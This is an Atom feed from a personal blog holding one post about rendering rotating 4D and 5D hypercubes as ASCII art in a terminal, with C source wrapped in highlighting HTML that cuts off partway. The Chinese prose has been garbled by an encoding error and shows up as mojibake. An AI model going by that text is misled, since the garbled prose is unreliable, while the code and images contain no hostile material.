<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KYRIOTA</title>
  
  
  <link href="https://kyriota.github.io/atom.xml" rel="self"/>
  
  <link href="https://kyriota.github.io/"/>
  <updated>2021-05-04T15:43:39.977Z</updated>
  <id>https://kyriota.github.io/</id>
  
  <author>
    <name>KYRIOTA</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello Dimension</title>
    <link href="https://kyriota.github.io/2021/04/24/Hello_Dimension/"/>
    <id>https://kyriota.github.io/2021/04/24/Hello_Dimension/</id>
    <published>2021-04-24T09:28:20.000Z</published>
    <updated>2021-05-04T15:43:39.977Z</updated>
    
    <content type="html"><![CDATA[<p>Meet Hypercubes~ O(âˆ©_âˆ©)O</p><p>ğŸ¦è¯­è¨€æ¸²æŸ“nç»´ç«‹æ–¹ä½“è‡³ç»ˆç«¯ï¼Œé‚£çœŸæ˜¯éå¸¸amazingå•Š</p><img src="/images/4Hypercube-transparent.gif" height="200" width="200" /><span id="more"></span><h1 id="Hello-Dimension"><a href="#Hello-Dimension" class="headerlink" title="Hello Dimension"></a>Hello Dimension</h1><p align="right"><small>So all this just to render a cube on your terminal ?</small></p><p>å°é¢gifä¸ºè¶…ç«‹æ–¹ä½“ç»•xwä¸xzè½´çš„æ—‹è½¬ï¼Œè‡³äºç»“æœçš„æ­£ç¡®æ€§ï¼Œæˆ‘å‚ç…§äº†wikiä¸”è‡ªè®¤ä¸ºæ— è¯¯ï¼Œä¾‹å¦‚ä¸‹å›¾å°±æ˜¯ä¸€äº›ä¸è¶…ç«‹æ–¹ä½“ç›¸å…³çš„å›¾ç‰‡</p><center><table>    <tr>        <td ><center><img src="/images/HypercubeStructure.gif" width=200 height=200>è¶…ç«‹æ–¹ä½“è§£æ„</center></td>        <td ><center><img src="/images/wikiHypercube.gif" width=200 height=200>è¶…ç«‹æ–¹ä½“ç»•xwè½´æ—‹è½¬</center></td>    </tr></table></center>ä¸å¦¨å…ˆæ¥çœ‹çœ‹æˆ‘çš„ä»£ç éƒ½æ¸²æŸ“å‡ºäº†äº›ä»€ä¹ˆï¼š<table><thead><tr><th>å›¾åƒ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><img src="/images/4HypercubeOpen.gif" width=500 height=500></td><td>æ­¤ä¸ºåœ¨<a href="https://kyriota.gitee.io/kyriota/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/">å›¾å½¢å­¦HelloWorld</a>åŸºç¡€ä¸Šä¿®æ”¹çš„ä»£ç ï¼Œé™äºæ¨¡å‹ç”ŸæˆåŸç†ä¸æ¸²æŸ“åŸç†å†™çš„ç¨€çƒ‚è€Œæ— æ³•æ‹“å±•åˆ°æ›´é«˜çš„äº”ç»´ï¼Œä¸”ç”±äºæ³•å‘é‡å¹¶éå®æ—¶è®¡ç®—è€Œæ˜¯æ‰‹åŠ¨è®¾ç½®ï¼Œå¯¼è‡´æ—‹è½¬æ—¶çš„â€å››ç»´é¢â€œæ¸²æŸ“é”™è¯¯ï¼ˆå°±æ˜¯gifä¸­çœ‹è§æ˜æ˜¾æ˜¯ä¸ªæ­£æ–¹ä½“ä½†æ˜¯å´æ²¡æœ‰æ­£ç¡®çš„æ‰“å…‰çš„ä¸€å¨åè¿‡æ¥åå›å»çš„ä¸œè¥¿ï¼‰</td></tr><tr><td><img src="/images/4Hypercube.gif" width=500 height=500></td><td>åæ¥å¯¹æ¨¡å‹ç”ŸæˆåŸç†ä¸æ¸²æŸ“åŸç†å¤§æ”¹ï¼Œå¼•å…¥é¡¶ç‚¹æ¨¡å‹å¹¶å®æ—¶è®¡ç®—æ³•å‘é‡ï¼Œæ­£ç¡®æ¸²æŸ“å‡ºäº†è¿™ä¸ªè¶…ç«‹æ–¹ä½“</td></tr><tr><td><img src="/images/5Hypercube.gif" width=500 height=500></td><td>åœ¨å››ç»´å‡äº”ç»´æ—¶åˆå‡ºç°äº†ä»£ç é€šç”¨æ€§çš„é—®é¢˜ï¼Œå‘ç°äº”ç»´æ—¶å­˜åœ¨å¤šå¤„ä¸‰è§’å½¢çš„å„é¡¶ç‚¹å‡ ä¹ä½äºåŒä¸€ç›´çº¿çš„æƒ…å†µï¼Œå¯¹åˆ¤æ–­è´¨å¿ƒä¸ç›´çº¿å…³ç³»çš„æ–¹ç¨‹å¼•å…¥ä¸€ä¸ªå¾ˆå°çš„Î”offestè§£å†³æ­¤é—®é¢˜</td></tr></tbody></table><p>æœ€åå†™äº†é€æ˜æè´¨ï¼Œä¸ºäº†æ–¹ä¾¿å’Œå®é™…æ•ˆæœæ²¡æœ‰å¯¹é€æ˜æè´¨è®¡ç®—å…‰ç…§ï¼Œé€æ˜ç‰©ä½“ä»£ç æ¯”ä¸é€æ˜çš„ç®€å•ï¼Œä½†ç¡®å®ä¾¿åˆ©äº†ç†è§£å†…éƒ¨ç»“æ„å˜åŒ–</p><center><table>    <tr>        <td ><center><img src="/images/4Hypercube-transparent.gif" width=200 height=200>é€æ˜å››ç»´ </center></td>        <td ><center><img src="/images/5Hypercube-transparent.gif" width=200 height=200>é€æ˜äº”ç»´</center></td>    </tr></table></center><div class='spoiler collapsed'>    <div class='spoiler-title'>        å¯¹æ¸²æŸ“ä¸æ¨¡å‹çš„æ”¹è¿›å¤§çº²    </div>    <div class='spoiler-content'>        <ul><li><p>ä¸‰è§’å½¢ï¼šå…ˆå‰çš„æ­£æ–¹ä½“å’Œçƒä½“æ¨¡å‹éƒ½æ˜¯å®é™…å­˜åœ¨äºæ•°ç»„ä¸­çš„éå¸¸å¤šçš„ç‚¹ï¼Œæ¯ä¸ªç‚¹ä¸å±å¹•ä¸Šçš„ç‚¹å¯¹åº”ï¼Œä¸ä»…ç©ºé—´å ç”¨å¤šï¼Œç®—åŠ›è·Ÿä¸ä¸Šï¼Œæ³•å‘é‡ä¹Ÿæ˜¯é’ˆå¯¹æ­£æ–¹ä½“å’Œçƒä½“çš„å‡ ä½•æ€§è´¨ä¸ºå…¶æ‰‹åŠ¨å®‰æ’çš„ï¼Œç¼ºä¹æ™®é€‚æ€§</p><ul><li>è§£å†³ï¼šå¯¹äºæ­£æ–¹ä½“ï¼Œåªéœ€è¦æ±‚å‡ºæ­£æ–¹ä½“çš„é¡¶ç‚¹ä»¥åŠé¡¶ç‚¹ä¹‹é—´çš„ä½ç½®å…³ç³»ï¼ˆå“ªäº›é¡¶ç‚¹ç›¸é‚»ï¼‰ï¼Œå³å¯ç”±æ­¤æ¨å¾—ä¸‰è§’å½¢ã€å››æ£±é”¥ç­‰ç‹¬ç«‹çš„å±€éƒ¨å›¾å½¢ï¼Œè¿™å¸¦æ¥çš„å¥½å¤„æœ‰ï¼š<ul><li>æ™®é€‚æ€§å¢å¼ºï¼Œå³ä½¿ç‰©ä½“ä¸æ˜¯æ­£æ–¹ä½“ä¹Ÿèƒ½ä»¥æ­¤æ–¹å¼è®¡ç®—ã€æ¸²æŸ“</li><li>æ€§èƒ½æå‡ï¼Œç»´åº¦å¾—ä»¥å‡çš„æ›´é«˜ï¼Œè®¡ç®—é€Ÿåº¦å¿«äº†äº¿ç‚¹ç‚¹</li><li>å¯ä»¥é€šè¿‡è®¡ç®—å±€éƒ¨è´¨å¿ƒå‡†ç¡®åŒºåˆ†å†…å¤–æ³•å‘é‡ï¼Œä½†æ˜¯æ­¤å¤„çš„æ­£æ–¹ä½“æ˜¯å‡¸å‡ ä½•ä½“ï¼Œç›´æ¥ä»¥åŸç‚¹ï¼ˆæ­£æ–¹ä½“è´¨å¿ƒï¼‰åŒºåˆ†å†…å¤–æ³•å‘é‡ä¹Ÿæ˜¯è¶³å¤Ÿçš„</li></ul></li></ul></li><li><p>å†…å¤–æ³•å‘é‡ï¼šç°æœ‰ä¸€æ¨¡å‹çš„ç›¸é‚»ä¸‰ç‚¹ç¡®å®šçš„å¹³é¢ABCï¼Œå¦‚ä½•åŒºåˆ†å†…å¤–æ³•å‘é‡ï¼Ÿ</p><ul><li><p>è§£å†³ï¼šå› ä¸ºæˆ‘é¢å¯¹çš„å¯¹è±¡æ˜¯æ­£æ–¹ä½“ï¼Œæ‰€ä»¥åªè¦å¯¹ä»»æ„é¡¶ç‚¹å‘é‡åŠ ä¸Šæ³•å‘é‡ï¼Œå°†ä½œæ­¤åç§»åçš„å‘é‡ä¸å…¶å¯¹åº”é¡¶ç‚¹å‘é‡æ¯”è¾ƒæ¨¡é•¿å¤§å°ï¼Œå³å¯åˆ¤æ–­å†…å¤–æ³•å‘é‡</p><img src="/images/HelloDimension_å¤–æ³•å‘é‡.jpg" width=200 height=200><p>ä½†è¿™æ ·ä¼šåœ¨å‡¹å‡ ä½•ä½“ä¸Šæœ‰è¯¯</p><img src="/images/HelloDimension_å…¨å±€è´¨å¿ƒ.jpg" width=200 height=200><p>æ‰€ä»¥æ™®é€‚çš„åšæ³•åº”æ˜¯å†å¯»æ‰¾ä¸€ä¸ªç›¸é‚»é¡¶ç‚¹ï¼Œç¡®å®šä¸€ä¸ªå››é¢ä½“ï¼Œè®¡ç®—æ­¤å››é¢ä½“è´¨å¿ƒï¼Œç„¶åä»¥æ­¤è´¨å¿ƒä¸ºåŸºå‡†ä½œåŒæ ·çš„åç§»åçš„æ¨¡é•¿æ¯”è¾ƒ</p></li></ul></li><li><p>é€è§†æŠ•å½±ï¼šäººçœ¼è§‚å¯Ÿç‰©ä½“æ˜¯å°å­”æˆåƒï¼Œé€è§†æŠ•å½±ï¼Œæ­£æŠ•å½±ä¼šç¼ºå°‘è¿‘å¤§è¿œå°çš„ç‰¹å¾ï¼Œä¸”åªæœ‰åœ¨é™ç»´æ—¶é€è§†æŠ•å½±æ‰èƒ½ä½¿é«˜ç»´å‡ ä½•ä½“æŠ•å½±å‡ºä»¤äººæ»¡æ„çš„æ•ˆæœï¼ˆå¦åˆ™å°±æ˜¯é»æˆä¸€å¨æ‰­æ¥æ‰­æ›²ï¼Œæ²¡æœ‰å¤§å°å˜åŒ–ï¼‰ï¼Œé€è§†æŠ•å½±çš„æŠ•å½±çŸ©é˜µé€šè¿‡ä¸€ä¸ªç›¸ä¼¼ä¸‰è§’å½¢å°±å‡ºæ¥äº†ï¼Œç‚¹åˆ°ä¸ºæ­¢</p></li><li><p>åŠé€æ˜æè´¨ï¼šå°±ç®€ä¸å°±ç¹ï¼Œå†ç²¾è‡´çš„é€æ˜æè´¨åœ¨ç»ˆç«¯ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œæˆ‘çš„åšæ³•æ˜¯ä¸å†è®¡ç®—æ³•å‘é‡ï¼Œå‘ç°æŠ•å½±åˆ°å±å¹•ä¸Šçš„é¢æœ‰å‡ ä¸ªï¼Œè¯¥ç‚¹çš„alphaå°±åŠ åˆ°å‡ ï¼Œç„¶ååº”ç”¨ä¸‹é¢è¿™ä¸ªå¼å­æŠŠalphaæ¢å› [0,1) å†…ï¼ˆæ•´ä¸ªå¹‚ä¸»è¦æ˜¯æƒ³è®©æ›²çº¿å¹³æ»‘ä¸€ç‚¹ï¼Œå»æ‰ä¹Ÿå¯ä»¥ï¼‰</p>  <center><code>alpha=1-1/(k*alpha+1)^3/2</code></center></li></ul>    </div></div><p>ä»¥ä¸‹æ˜¯æœ€ç»ˆçš„æºç ï¼Œé‡è¦å‚æ•°å…¨éƒ¨åœ¨defineæˆ–å…¨å±€å˜é‡ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0.6</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;</span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;</span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;</span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;</span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;</span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];</span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];</span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];</span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));</span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)</span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)</span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;&#125;&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)</span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)</span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])</span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;&#125;&#125;&#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);&#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])</span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);&#125;</span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];</span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        